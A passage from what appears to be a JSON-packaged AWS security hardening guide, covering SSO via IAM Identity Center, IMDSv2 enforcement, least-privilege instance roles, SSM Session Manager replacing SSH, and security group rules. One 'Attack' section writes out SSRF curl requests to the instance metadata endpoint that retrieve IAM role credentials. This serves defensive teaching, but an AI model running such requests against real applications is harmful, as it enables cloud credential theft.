authenticates: username + password + MFA\\n        \\u2502\\n        \\u25bc\\nIdentity Center validates with your IdP\\n        \\u2502\\n        \\u25bc\\nSTS issues temporary credentials (AccessKeyId ASIA..., SessionToken)\\n        \\u2502\\n        \\u25bc\\nAWS CLI/SDK uses them transparently\\n        \\u2502\\n        \\u25bc\\nCredentials expire \\u2192 re-login required (no manual rotation ever)\\n```\\n\\n---\\n\\n## Setup\\n\\n### Step 1 \\u2014 Enable Identity Center\\n```bash\\n# Enable via console or CLI (one-time, per organization)\\naws sso-admin list-instances\\n# If empty, enable Identity Center in AWS Console under IAM Identity Center\\n\\n# List your Identity Center instance\\naws sso-admin list-instances \\\\\\n  --query 'Instances[*].[InstanceArn,IdentityStoreId]' \\\\\\n  --output table\\n```\\n\\n### Step 2 \\u2014 Configure AWS CLI for SSO\\n```bash\\n# Interactive setup\\naws configure sso\\n\\n# It will ask:\\n# SSO start URL: https://mycompany.awsapps.com/start\\n# SSO region: ap-south-1\\n# Account ID and role to use\\n\\n# This writes to ~/.aws/config (no secrets in this file)\\ncat ~/.aws/config\\n# [profile dev-account]\\n# sso_session = my-sso\\n# sso_account_id = 123456789012\\n# sso_role_name = DeveloperAccess\\n# region = ap-south-1\\n#\\n# [sso-session my-sso]\\n# sso_start_url = https://mycompany.awsapps.com/start\\n# sso_region = ap-south-1\\n# sso_registration_scopes = sso:account:access\\n```\\n\\n### Step 3 \\u2014 Login and Use\\n```bash\\n# Authenticate (opens browser, MFA prompt)\\naws sso login --profile dev-account\\n\\n# Use AWS normally \\u2014 credentials handled transparently\\naws s3 ls --profile dev-account\\naws ec2 describe-instances --profile dev-account\\n\\n# Set default profile to avoid --profile every time\\nexport AWS_PROFILE=dev-account\\n\\n# Verify what identity you are using\\naws sts get-caller-identity\\n# {\\n#   \\\"UserId\\\": \\\"AROA...:sharan@company.com\\\",\\n#   \\\"Account\\\": \\\"123456789012\\\",\\n#   \\\"Arn\\\": \\\"arn:aws:sts::123456789012:assumed-role/DeveloperAccess/sharan@company.com\\\"\\n# }\\n\\n# Check when your session expires\\naws sts get-caller-identity 2>&1 || echo \\\"Session expired \\u2014 run aws sso login\\\"\\n```\\n\\n---\\n\\n## Credential Lifecycle\\n```bash\\n# Temp credentials are cached here (auto-managed by CLI)\\nls ~/.aws/sso/cache/       # SSO tokens\\nls ~/.aws/cli/cache/       # STS credentials\\n\\n# View the cached credentials (for debugging only)\\ncat ~/.aws/cli/cache/*.json | python3 -m json.tool\\n# {\\n#   \\\"AccessKeyId\\\": \\\"ASIA...\\\",\\n#   \\\"SecretAccessKey\\\": \\\"...\\\",\\n#   \\\"SessionToken\\\": \\\"...\\\",\\n#   \\\"Expiration\\\": \\\"2024-01-01T08:00:00Z\\\"   <-- auto-expires\\n# }\\n\\n# Logout \\u2014 invalidates session\\naws sso logout --profile dev-account\\n```\\n\\n---\\n\\n## Using SSO Credentials in Scripts and SDKs\\n\\n```bash\\n# boto3 \\u2014 automatically picks up SSO profile\\npython3 - <<'EOF'\\nimport boto3\\n\\nsession = boto3.Session(profile_name='dev-account')\\ns3 = session.client('s3')\\nbuckets = s3.list_buckets()\\nprint([b['Name'] for b in buckets['Buckets']])\\nEOF\\n\\n# If session is expired, boto3 raises botocore.exceptions.UnauthorizedSSOTokenError\\n# Handle it:\\npython3 - <<'EOF'\\nimport boto3\\nfrom botocore.exceptions import UnauthorizedSSOTokenError\\n\\ntry:\\n    session = boto3.Session(profile_name='dev-account')\\n    sts = session.client('sts')\\n    print(sts.get_caller_identity())\\nexcept UnauthorizedSSOTokenError:\\n    print(\\\"SSO session expired. Run: aws sso login --profile dev-account\\\")\\nEOF\\n```\\n\\n---\\n\\n## Assign Permissions to Users/Groups\\n\\n```bash\\n# List permission sets (roles users can assume)\\naws sso-admin list-permission-sets \\\\\\n  --instance-arn arn:aws:sso:::instance/ssoins-xxx \\\\\\n  --query 'PermissionSets' --output text\\n\\n# Assign a permission set to a group for an account\\naws sso-admin create-account-assignment \\\\\\n  --instance-arn arn:aws:sso:::instance/ssoins-xxx \\\\\\n  --target-id 123456789012 \\\\\\n  --target-type AWS_ACCOUNT \\\\\\n  --permission-set-arn arn:aws:sso:::permissionSet/ssoins-xxx/ps-xxx \\\\\\n  --principal-type GROUP \\\\\\n  --principal-id group-id-from-identity-store\\n\\n# List all assignments for an account\\naws sso-admin list-account-assignments \\\\\\n  --instance-arn arn:aws:sso:::instance/ssoins-xxx \\\\\\n  --account-id 123456789012 \\\\\\n  --permission-set-arn arn:aws:sso:::permissionSet/ssoins-xxx/ps-xxx\\n```\\n\\n---\\n\\n## Checklist\\n\\n- [ ] IAM Identity Center enabled in AWS Organizations\\n- [ ] All human users access AWS via SSO \\u2014 no static keys\\n- [ ] MFA enforced at the IdP level (Okta / Azure AD / native)\\n- [ ] Permission sets follow least privilege \\u2014 scoped per team/role\\n- [ ] Root account has no active access keys\\n- [ ] Existing static key users have a migration plan to SSO\\n- [ ] SDK/scripts updated to use `boto3.Session(profile_name=...)` with SSO profiles\\n\"}], \"tags\": [\"static-keys\", \"role-abuse\", \"priv-esc\", \"sso\"], \"desc\": \"Static key lifecycle, role abuse chains, privilege escalation paths, Identity Center SSO\"}, {\"id\": \"02-ec2-compute\", \"num\": \"02\", \"name\": \"EC2 &amp; Compute\", \"readme\": \"# 02 \\u2014 EC2 & Compute Security\\n\\nEC2 instances are a common entry point for attackers \\u2014 either directly (exposed SSH, vulnerable apps) or as a stepping stone to steal IAM role credentials via IMDS.\\n\\n## Topics\\n\\n| File | Topic |\\n|------|-------|\\n| [01-imdsv2.md](./01-imdsv2.md) | Enforcing IMDSv2 to block credential theft |\\n| [02-instance-roles.md](./02-instance-roles.md) | Scoping instance roles to least privilege |\\n| [03-ssh-hardening.md](./03-ssh-hardening.md) | Eliminating SSH keys in favor of SSM Session Manager |\\n\\n## Key Threat Model\\n\\n```\\nExposed SSH (port 22)        Vulnerable App (SSRF)      Overprivileged Role\\n        \\u2502                            \\u2502                          \\u2502\\n        \\u25bc                            \\u25bc                          \\u25bc\\nShell access to instance     IMDS credential theft      Blast radius = full account\\n```\\n\\n## Top 5 EC2 Controls\\n\\n1. Enforce IMDSv2 on all instances \\u2014 blocks SSRF-based credential theft\\n2. Remove SSH port 22 from security groups \\u2014 use SSM Session Manager\\n3. Run instances in private subnets \\u2014 no direct internet exposure\\n4. Scope instance IAM roles to the minimum needed\\n5. Enable VPC Flow Logs to detect unusual outbound traffic\\n\", \"docs\": [{\"slug\": \"01-imdsv2\", \"title\": \"IMDSv2 \\u2014 Instance Metadata Service Hardening\", \"content\": \"# IMDSv2 \\u2014 Instance Metadata Service Hardening\\n\\n## The Problem\\n\\nThe Instance Metadata Service (IMDS) at `169.254.169.254` exposes IAM role credentials to any process on the EC2 instance. IMDSv1 requires only a simple GET request \\u2014 trivially exploitable via SSRF vulnerabilities or direct shell access.\\n\\n---\\n\\n## IMDSv1 vs IMDSv2\\n\\n```\\nIMDSv1 (insecure)                   IMDSv2 (secure)\\n\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500                   \\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\nSingle GET request                  Two-step: PUT token first, then GET\\nNo session required                 Session token required (TTL: 1-21600s)\\nExploitable via SSRF                SSRF can't do the PUT step\\ncurl http://169.254.169.254/...     Requires custom header X-aws-ec2-metadata-token\\n```\\n\\n---\\n\\n## Attack \\u2014 IMDSv1 Credential Theft via SSRF\\n\\n```bash\\n# Vulnerable app at: https://myapp.com/fetch?url=<target>\\n# Attacker sends:\\ncurl \\\"https://myapp.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\\\"\\n# Response: MyAppRole\\n\\ncurl \\\"https://myapp.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/MyAppRole\\\"\\n# Response: {\\\"AccessKeyId\\\": \\\"ASIA...\\\", \\\"SecretAccessKey\\\": \\\"...\\\", \\\"Token\\\": \\\"...\\\"}\\n# Attacker now has credentials valid for 1 hour\\n```\\n\\nWith IMDSv2, the PUT step uses a custom header that SSRF proxies typically cannot forward:\\n```bash\\n# IMDSv2 requires this first step \\u2014 SSRF usually can't replicate it\\nTOKEN=$(curl -s -X PUT \\\"http://169.254.169.254/latest/api/token\\\" \\\\\\n  -H \\\"X-aws-ec2-metadata-token-ttl-seconds: 21600\\\")\\n\\n# Then use the token\\ncurl -s \\\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\\\" \\\\\\n  -H \\\"X-aws-ec2-metadata-token: $TOKEN\\\"\\n```\\n\\n---\\n\\n## Detection \\u2014 Find Instances Without IMDSv2\\n\\n```bash\\n# Check all instances \\u2014 find those still on IMDSv1 (HttpTokens = optional)\\naws ec2 describe-instances \\\\\\n  --query 'Reservations[*].Instances[*].[InstanceId,MetadataOptions.HttpTokens,Tags[?Key==`Name`].Value|[0]]' \\\\\\n  --output table\\n\\n# Filter only the non-compliant ones\\naws ec2 describe-instances \\\\\\n  --filters \\\"Name=metadata-options.http-tokens,Values=optional\\\" \\\\\\n  --query 'Reservations[*].Instances[*].[InstanceId,PrivateIpAddress]' \\\\\\n  --output table\\n\\n# Count of non-compliant instances\\naws ec2 describe-instances \\\\\\n  --filters \\\"Name=metadata-options.http-tokens,Values=optional\\\" \\\\\\n  --query 'length(Reservations[*].Instances[*])' \\\\\\n  --output text\\n```\\n\\n---\\n\\n## Fix \\u2014 Enforce IMDSv2\\n\\n```bash\\n# Enforce on a single instance (no restart required)\\naws ec2 modify-instance-metadata-options \\\\\\n  --instance-id i-0123456789abcdef0 \\\\\\n  --http-tokens required \\\\\\n  --http-endpoint enabled \\\\\\n  --http-put-response-hop-limit 1\\n\\n# Enforce on ALL instances in a region (use carefully)\\naws ec2 describe-instances \\\\\\n  --query 'Reservations[*].Instances[*].InstanceId' \\\\\\n  --output text | tr '\\\\t' '\\\\n' | while read instance_id; do\\n    echo \\\"Enforcing IMDSv2 on $instance_id\\\"\\n    aws ec2 modify-instance-metadata-options \\\\\\n      --instance-id \\\"$instance_id\\\" \\\\\\n      --http-tokens required \\\\\\n      --http-endpoint enabled\\n  done\\n\\n# Verify enforcement\\naws ec2 describe-instances \\\\\\n  --instance-ids i-0123456789abcdef0 \\\\\\n  --query 'Reservations[*].Instances[*].MetadataOptions'\\n# Should show: \\\"HttpTokens\\\": \\\"required\\\"\\n```\\n\\n---\\n\\n## Prevention \\u2014 Enforce at Launch via AWS Config\\n\\n```bash\\n# Create an AWS Config rule to flag non-IMDSv2 instances\\naws configservice put-config-rule \\\\\\n  --config-rule '{\\n    \\\"ConfigRuleName\\\": \\\"ec2-imdsv2-required\\\",\\n    \\\"Description\\\": \\\"Checks that all EC2 instances require IMDSv2\\\",\\n    \\\"Source\\\": {\\n      \\\"Owner\\\": \\\"AWS\\\",\\n      \\\"SourceIdentifier\\\": \\\"EC2_IMDSV2_REQUIRED\\\"\\n    },\\n    \\\"Scope\\\": {\\n      \\\"ComplianceResourceTypes\\\": [\\\"AWS::EC2::Instance\\\"]\\n    }\\n  }'\\n\\n# Check compliance status\\naws configservice describe-compliance-by-config-rule \\\\\\n  --config-rule-names ec2-imdsv2-required\\n\\n# Set hop limit to 1 \\u2014 prevents containers on the instance from reaching IMDS\\n# (hop limit of 2 needed only if using containers on EC2)\\naws ec2 modify-instance-metadata-options \\\\\\n  --instance-id i-0123456789abcdef0 \\\\\\n  --http-put-response-hop-limit 1 \\\\\\n  --http-tokens required\\n```\\n\\n---\\n\\n## Prevention \\u2014 Block IMDSv1 in Launch Templates\\n\\n```bash\\n# Create a launch template that enforces IMDSv2 by default\\naws ec2 create-launch-template \\\\\\n  --launch-template-name secure-default \\\\\\n  --launch-template-data '{\\n    \\\"MetadataOptions\\\": {\\n      \\\"HttpTokens\\\": \\\"required\\\",\\n      \\\"HttpEndpoint\\\": \\\"enabled\\\",\\n      \\\"HttpPutResponseHopLimit\\\": 1\\n    }\\n  }'\\n\\n# Use this template for all new instances\\naws ec2 run-instances \\\\\\n  --launch-template LaunchTemplateName=secure-default \\\\\\n  --image-id ami-12345678 \\\\\\n  --instance-type t3.micro\\n```\\n\\n---\\n\\n## Checklist\\n\\n- [ ] All existing instances set to `HttpTokens: required`\\n- [ ] Launch templates enforce IMDSv2 by default\\n- [ ] AWS Config rule `EC2_IMDSV2_REQUIRED` active and monitored\\n- [ ] Hop limit set to 1 (or 2 if running containers on EC2)\\n- [ ] CloudWatch alarm on IMDSv1 usage metrics\\n- [ ] Application code updated to use IMDSv2 token if directly calling IMDS\\n\"}, {\"slug\": \"02-instance-roles\", \"title\": \"EC2 Instance Roles \\u2014 Least Privilege\", \"content\": \"# EC2 Instance Roles \\u2014 Least Privilege\\n\\n## The Problem\\n\\nAn EC2 instance role with overly broad permissions means any compromised process on the machine \\u2014 malware, a vulnerable app, an attacker with shell \\u2014 inherits those permissions automatically.\\n\\n---\\n\\n## Common Mistakes\\n\\n```bash\\n# Mistake 1: Attaching AdministratorAccess to an instance\\naws iam attach-role-policy \\\\\\n  --role-name MyEC2Role \\\\\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\\n# Any code running on this EC2 = full AWS admin\\n\\n# Mistake 2: Wildcard S3 access when only one bucket is needed\\n{\\n  \\\"Effect\\\": \\\"Allow\\\",\\n  \\\"Action\\\": \\\"s3:*\\\",\\n  \\\"Resource\\\": \\\"*\\\"\\n}\\n# Should be: specific bucket, specific actions only\\n```\\n\\n---\\n\\n## Detection \\u2014 Audit Instance Role Permissions\\n\\n```bash\\n# 1. Find the role attached to an EC2 instance\\naws ec2 describe-instances \\\\\\n  --instance-ids i-0123456789abcdef0 \\\\\\n  --query 'Reservations[*].Instances[*].IamInstanceProfile.Arn' \\\\\\n  --output text\\n\\n# 2. Get the role name from instance profile\\naws iam get-instance-profile \\\\\\n  --instance-profile-name MyInstanceProfile \\\\\\n  --query 'InstanceProfile.Roles[*].RoleName' \\\\\\n  --output text\\n\\n# 3. List all policies attached to the role\\naws iam list-attached-role-policies --role-name MyEC2Role\\naws iam list-role-policies --role-name MyEC2Role  # inline policies\\n\\n# 4. Check for overly permissive policies\\naws iam get-role-policy \\\\\\n  --role-name MyEC2Role \\\\\\n  --policy-name MyInlinePolicy\\n\\n# 5. Find all EC2 roles with AdministratorAccess\\naws iam list-entities-for-policy \\\\\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess \\\\\\n  --entity-filter Role\\n```\\n\\n---\\n\\n## Fix \\u2014 Apply Least Privilege\\n\\n```bash\\n# Remove overly broad policy\\naws iam detach-role-policy \\\\\\n  --role-name MyEC2Role \\\\\\n  --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess\\n\\n# Create a scoped-down policy \\u2014 only what the app actually needs\\naws iam create-policy \\\\\\n  --policy-name AppMinimalS3Access \\\\\\n  --policy-document '{\\n    \\\"Version\\\": \\\"2012-10-17\\\",\\n    \\\"Statement\\\": [\\n      {\\n        \\\"Effect\\\": \\\"Allow\\\",\\n        \\\"Action\\\": [\\\"s3:GetObject\\\", \\\"s3:PutObject\\\"],\\n        \\\"Resource\\\": \\\"arn:aws:s3:::my-specific-app-bucket/*\\\"\\n      },\\n      {\\n        \\\"Effect\\\": \\\"Allow\\\",\\n        \\\"Action\\\": \\\"s3:ListBucket\\\",\\n        \\\"Resource\\\": \\\"arn:aws:s3:::my-specific-app-bucket\\\"\\n      }\\n    ]\\n  }'\\n\\n# Attach the scoped policy\\naws iam attach-role-policy \\\\\\n  --role-name MyEC2Role \\\\\\n  --policy-arn arn:aws:iam::123456789:policy/AppMinimalS3Access\\n```\\n\\n---\\n\\n## Add Conditions to Limit Blast Radius\\n\\n```bash\\n# Restrict S3 access to only your VPC endpoint\\naws iam create-policy \\\\\\n  --policy-name VpcScopedS3Access \\\\\\n  --policy-document '{\\n    \\\"Version\\\": \\\"2012-10-17\\\",\\n    \\\"Statement\\\": [\\n      {\\n        \\\"Effect\\\": \\\"Allow\\\",\\n        \\\"Action\\\": [\\\"s3:GetObject\\\"],\\n        \\\"Resource\\\": \\\"arn:aws:s3:::my-bucket/*\\\"\\n      },\\n      {\\n        \\\"Effect\\\": \\\"Deny\\\",\\n        \\\"Action\\\": \\\"s3:*\\\",\\n        \\\"Resource\\\": \\\"*\\\",\\n        \\\"Condition\\\": {\\n          \\\"StringNotEquals\\\": {\\n            \\\"aws:SourceVpce\\\": \\\"vpce-0123456789abcdef0\\\"\\n          }\\n        }\\n      }\\n    ]\\n  }'\\n# Even if credentials are stolen, they only work inside your VPC\\n```\\n\\n---\\n\\n## Use IAM Access Advisor to Right-Size Permissions\\n\\n```bash\\n# Generate a service last-accessed report for the role\\naws iam generate-service-last-accessed-details \\\\\\n  --arn arn:aws:iam::123456789:role/MyEC2Role\\n\\n# Get the job ID from the response, then fetch results\\naws iam get-service-last-accessed-details \\\\\\n  --job-id <job-id> \\\\\\n  --query 'ServicesLastAccessed[?TotalAuthenticatedEntities>`0`].[ServiceName,LastAuthenticated]' \\\\\\n  --output table\\n\\n# Services with LastAuthenticated = null or very old = remove them from the policy\\n```\\n\\n---\\n\\n## Checklist\\n\\n- [ ] No EC2 instance has `AdministratorAccess` attached\\n- [ ] Instance roles scoped to specific resources (not `*`)\\n- [ ] IAM Access Advisor reviewed \\u2014 unused services removed\\n- [ ] Permission boundaries applied to all instance roles\\n- [ ] VPC endpoint conditions on S3/DynamoDB access where possible\\n- [ ] Roles audited quarterly for permission creep\\n\"}, {\"slug\": \"03-ssh-hardening\", \"title\": \"SSH Hardening \\u2014 Replace SSH with SSM Session Manager\", \"content\": \"# SSH Hardening \\u2014 Replace SSH with SSM Session Manager\\n\\n## The Problem\\n\\nPort 22 open to the internet is one of the most scanned ports globally. Static SSH keys on developer laptops get lost, stolen, or forgotten. Every key is a permanent door into your instances.\\n\\n---\\n\\n## The Better Approach \\u2014 AWS Systems Manager Session Manager\\n\\nNo open ports. No SSH keys. Browser or CLI access through IAM authentication.\\n\\n```\\nTraditional SSH                     SSM Session Manager\\n\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500                     \\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\u2500\\nPort 22 open in security group      Zero open inbound ports\\nStatic SSH key on laptop            IAM identity + MFA\\nKey rotation is manual              No keys to rotate\\nNo audit trail by default           Every session logged to CloudTrail + S3\\nDirect internet exposure needed     Works in private subnets\\n```\\n\\n---\\n\\n## Detection \\u2014 Find Instances with Port 22 Exposed\\n\\n```bash\\n# Find security groups with SSH open to the world\\naws ec2 describe-security-groups \\\\\\n  --filters \\\"Name=ip-permission.from-port,Values=22\\\" \\\\\\n             \\\"Name=ip-permission.to-port,Values=22\\\" \\\\\\n             \\\"Name=ip-permission.cidr,Values=0.0.0.0/0\\\" \\\\\\n  --query 'SecurityGroups[*].[GroupId,GroupName,Description]' \\\\\\n  --output table\\n\\n# Find instances using those security groups\\naws ec2 describe-instances \\\\\\n  --filters \\\"Name=instance.group-name,Values=<group-name>\\\" \\\\\\n  --query 'Reservations[*].Instances[*].[InstanceId,PublicIpAddress,Tags[?Key==`Name`].Value|[0]]' \\\\\\n  --output table\\n\\n# AWS Config rule to flag port 22 open to 0.0.0.0/0\\naws configservice put-config-rule \\\\\\n  --config-rule '{\\n    \\\"ConfigRuleName\\\": \\\"restricted-ssh\\\",\\n    \\\"Source\\\": {\\n      \\\"Owner\\\": \\\"AWS\\\",\\n      \\\"SourceIdentifier\\\": \\\"INCOMING_SSH_DISABLED\\\"\\n    }\\n  }'\\n```\\n\\n---\\n\\n## Fix \\u2014 Set Up SSM Session Manager\\n\\n### Step 1 \\u2014 Attach SSM Policy to Instance Role\\n```bash\\n# The instance needs this policy to communicate with SSM\\naws iam attach-role-policy \\\\\\n  --role-name MyEC2Role \\\\\\n  --policy-arn arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore\\n\\n# Verify the SSM agent is running on the instance\\naws ssm describe-instance-information \\\\\\n  --query 'InstanceInformationList[*].[InstanceId,PingStatus,LastPingDateTime]' \\\\\\n  --output table\\n```\\n\\n### Step 2 \\u2014 Start a Session (No SSH Key Needed)\\n```bash\\n# Install Session Manager plugin for AWS CLI\\n# https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager-working-with-install-plugin.html\\n\\n# Open an interactive shell session\\naws ssm start-session --target i-0123456789abcdef0\\n\\n# Run a command without interactive session\\naws ssm send-command \\\\\\n  --instance-ids i-0123456789abcdef0 \\\\\\n  --document-name \\\"AWS-RunShellScript\\\" \\\\\\n  --parameters 'commands=[\\\"df -h\\\",\\\"free -m\\\"]' \\\\\\n  --query 'Command.CommandId' \\\\\\n  --output text\\n\\n# Get command output\\naws ssm get-command-invocation \\\\\\n  --command-id <command-id> \\\\\\n  --instance-id i-0123456789abcdef0 \\\\\\n  --query '[StandardOutputContent,StandardErrorContent]'\\n```\\n\\n### Step 3 \\u2014 Enable Session Logging to S3\\n```bash\\n# Configure session logs \\u2014 every command is recorded\\naws ssm update-document \\\\\\n  --name \\\"SSM-SessionManagerRunShell\\\" \\\\\\n  --document-version \\\"\\\\$LATEST\\\" \\\\\\n  --content '{\\n    \\\"schemaVersion\\\": \\\"1.0\\\",\\n    \\\"description\\\": \\\"SSM Session Manager preferences\\\",\\n    \\\"sessionType\\\": \\\"Standard_Stream\\\",\\n    \\\"inputs\\\": {\\n      \\\"s3BucketName\\\": \\\"my-ssm-session-logs\\\",\\n      \\\"s3EncryptionEnabled\\\": true,\\n      \\\"cloudWatchLogGroupName\\\": \\\"/ssm/sessions\\\",\\n      \\\"cloudWatchEncryptionEnabled\\\": true\\n    }\\n  }'\\n```\\n\\n### Step 4 \\u2014 Remove Port 22 from Security Groups\\n```bash\\n# Revoke SSH access from the security group\\naws ec2 revoke-security-group-ingress \\\\\\n  --group-id sg-0123456789abcdef0 \\\\\\n  --protocol tcp \\\\\\n  --port 22 \\\\\\n  --cidr 0.0.0.0/0\\n\\n# Verify no SSH rules remain\\naws ec2 describe-security-groups \\\\\\n  --group-ids sg-0123456789abcdef0 \\\\\\n  --query 'SecurityGroups[*].IpPermissions[?FromPort==`22`]'\\n```\\n\\n---\\n\\n## If You Must Keep SSH \\u2014 Harden It\\n\\n```bash\\n# Use EC2 Instance Connect instead of static keys\\n# Sends a one-time SSH public key valid for 60 seconds\\naws ec2-instance-connect send-ssh-public-key \\\\\\n  --instance-id i-0123456789abcdef0 \\\\\\n  --instance-os-user ec2-user \\\\\\n  --ssh-public-key file://~/.ssh/id_rsa.pub \\\\\\n  --availability-zone ap-south-1a\\n\\n# Then SSH in within 60 seconds\\nssh -i ~/.ssh/id_rsa ec2-user@<instance-ip>\\n\\n# Restrict SSH to specific IPs only (not 0.0.0.0/0)\\naws ec2 authorize-security-group-ingress \\\\\\n  --group-id sg-0123456789abcdef0 \\\\\\n  --protocol tcp \\\\\\n  --port 22 \\\\\\n  --cidr 203.0.113.10/32  # Your office IP only\\n```\\n\\n---\\n\\n## Checklist\\n\\n- [ ] No security group has port 22 open to `0.0.0.0/0` or `::/0`\\n- [ ] SSM Agent installed and running on all EC2 instances\\n- [ ] `AmazonSSMManagedInstanceCore` policy attached to all instance roles\\n- [ ] Session Manager configured to log to S3 and CloudWatch\\n- [ ] AWS Config rule `INCOMING_SSH_DISABLED` active\\n- [ ] EC2 Instance Connect used for emergency access if SSH needed\\n- [ ] Instances in private subnets \\u2014 no public IPs where possible\\n\"}], \"tags\": [\"imdsv2\", \"ssm\", \"ebs-encryption\"], \"desc\": \"IMDSv2 enforcement, instance role scoping, SSH eliminated via SSM Session Manager\"}, {\"id\": \"03-network-vpc\", \"num\": \"03\", \"name\": \"Network &amp; VPC\", \"readme\": \"# 03 \\u2014 Network & VPC Security\\n\\nNetwork security controls limit what attackers can reach and what compromised resources can communicate with. Even if an attacker gains access to a resource, network controls can contain the blast radius.\\n\\n## Topics\\n\\n| File | Topic |\\n|------|-------|\\n| [01-security-groups.md](./01-security-groups.md) | Locking down inbound/outbound rules |\\n| [02-vpc-endpoints.md](./02-vpc-endpoints.md) | Keeping AWS service traffic off the public internet |\\n| [03-flow-logs.md](./03-flow-logs.md) | Enabling and analyzing VPC Flow Logs |\\n\\n## Key Threat Model\\n\\n```\\nOverly permissive SGs       No VPC Endpoints              No Flow Logs\\n        \\u2502                          \\u2502                             \\u2502\\n        \\u25bc                          \\u25bc                             \\u25bc\\nOpen ports = attack surface  Credentials work outside VPC  No visibility into\\nLateral movement easy        Data exfil over public internet  who talked to what\\n```\\n\\n## Top 5 Network Controls\\n\\n1. Security groups should deny all inbound by default \\u2014 allow only specific ports/sources\\n2. Use VPC endpoints for S3, DynamoDB, STS \\u2014 never route through IGW\\n3. Put all compute in private subnets \\u2014 only load balancers in public\\n4. Enable VPC Flow Logs to S3 or CloudWatch\\n5. Use NACLs as a secondary stateless layer for critical subnets\\n\", \"docs\": [{\"slug\": \"01-security-groups\", \"title\": \"Security Groups \\u2014 Hardening Inbound and Outbound Rules\", \"content\": \"# Security Groups \\u2014 Hardening Inbound and Outbound Rules\\n\\n## The Problem\\n\\nSecurity groups default to deny-all inbound and allow-all outbound. Misconfigured groups open the attack surface \\u2014 allowing attackers to probe services or exfiltrate data freely.\\n\\n---\\n\\n## Common Mistakes\\n\\n```bash\\n# Mistake 1: Open SSH/RDP to the entire internet\\n# From port 22 / cidr 0.0.0.0/0\\n\\n# Mistake 2: Outbound allow-all \\u2014 lets compromised instance call anything\\n# To port all / protocol all / cidr 0.0.0.0/0\\n\\n# Mistake 3: Using a single security group for all resources\\n# One misconfiguration = all resources exposed\\n\\n# Mistake 4: Unused rules left from old workloads\\n# Old ports still open, nobody knows what uses them\\n```\\n\\n---\\n\\n## Detection \\u2014 Audit Security Groups\\n\\n```bash\\n# Find security groups with inbound rules open to 0.0.0.0/0\\naws ec2 describe-security-groups \\\\\\n  --query 'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]].\\n           [GroupId,GroupName,IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]]' \\\\\\n  --output json\\n\\n# Find all rules open on all ports (port -1)\\naws ec2 describe-security-groups \\\\\\n  --filters \\\"Name=ip-permission.from-port,Values=-1\\\" \\\\\\n  --query 'SecurityGroups[*].[GroupId,GroupName]' \\\\\\n  --output table\\n\\n# Find unused security groups (not attached to any resource)\\naws ec2 describe-security-groups \\\\\\n  --query 'SecurityGroups[*].GroupId' --output text | tr '\\\\t' '\\\\n' > /tmp/all-sgs.txt\\n\\naws ec2 describe-network-interfaces \\\\\\n  --query 'NetworkInterfaces[*].Groups[*].GroupId' --output text | tr '\\\\t' '\\\\n' | sort -u > /tmp/used-sgs.txt\\n\\ncomm -23 <(sort /tmp/all-sgs.txt) /tmp/used-sgs.txt\\n# Output = unused security groups \\u2014 candidates for deletion\\n```\\n\\n---\\n\\n## Fix \\u2014 Apply Least Privilege to Security Groups\\n\\n```bash\\n# Remove overly broad inbound rule\\naws ec2 revoke-security-group-ingress \\\\\\n  --group-id sg-0123456789abcdef0 \\\\\\n  --protocol tcp \\\\\\n  --port 22 \\\\\\n  --cidr 0.0.0.0/0\\n\\n# Add a scoped rule \\u2014 only your NAT gateway or bastion IP\\naws ec2 authorize-security-group-ingress \\\\\\n  --group-id sg-0123456789abcdef0 \\\\\\n  --protocol tcp \\\\\\n  --port 443 \\\\\\n  --source-group sg-alb-security-group  # Reference SG, not CIDR\\n# This allows only traffic from the ALB security group \\u2014 nothing else\\n\\n# Restrict outbound \\u2014 only allow what the app actually needs\\naws ec2 revoke-security-group-egress \\\\\\n  --group-id sg-0123456789abcdef0 \\\\\\n  --protocol all \\\\\\n  --port all \\\\\\n  --cidr 0.0.0.0/0\\n\\naws ec2 authorize-security-group-egress \\\\\\n  --group-id sg-0123456789abcdef0 \\\\\\n  --protocol tcp \\\\\\n  --port 443 \\\\\\n  --cidr 0.0.0.0/0  # HTTPS only outbound\\n\\naws ec2 authorize-security-group-egress \\\\\\n  --group-id sg-0123456789abcdef0 \\\\\\n  --protocol tcp \\\\\\n  --port 5432 \\\\\\n  --source-group sg-rds-security-group  # DB access only to RDS SG\\n```\\n\\n---\\n\\n## Recommended Security Group Architecture\\n\\n```\\nInternet\\n    \\u2502\\n    \\u25bc\\n[ALB Security Group]          Inbound: 443 from 0.0.0.0/0\\n    \\u2502                         Outbound: 8080 to App SG\\n    \\u25bc\\n[App Security Group]          Inbound: 8080 from ALB SG only\\n    \\u2502                         Outbound: 5432 to DB SG, 443 to 0.0.0.0/0\\n    \\u25bc\\n[DB Security Group]           Inbound: 5432 from App SG only\\n                              Outbound: nothing\\n```\\n\\n```bash\\n# Create the layered security groups\\n# ALB SG\\naws ec2 create-security-group \\\\\\n  --group-name alb-sg \\\\\\n  --description \\\"ALB - public HTTPS only\\\" \\\\\\n  --vpc-id vpc-0123456789abcdef0\\n\\naws ec2 authorize-security-group-ingress \\\\\\n  --group-id <alb-sg-id> --protocol tcp --port 443 --cidr 0.0.0.0/0\\n\\n# App SG - only from ALB\\naws ec2 create-security-group \\\\\\n  --group-name app-sg \\\\\\n  --description \\\"App servers - from ALB only\\\" \\\\\\n  --vpc-id vpc-0123456789abcdef0\\n\\naws ec2 authorize-security-group-ingress \\\\\\n  --group-id <app-sg-id> --protocol tcp --port 8080 \\\\\\n  --source-group 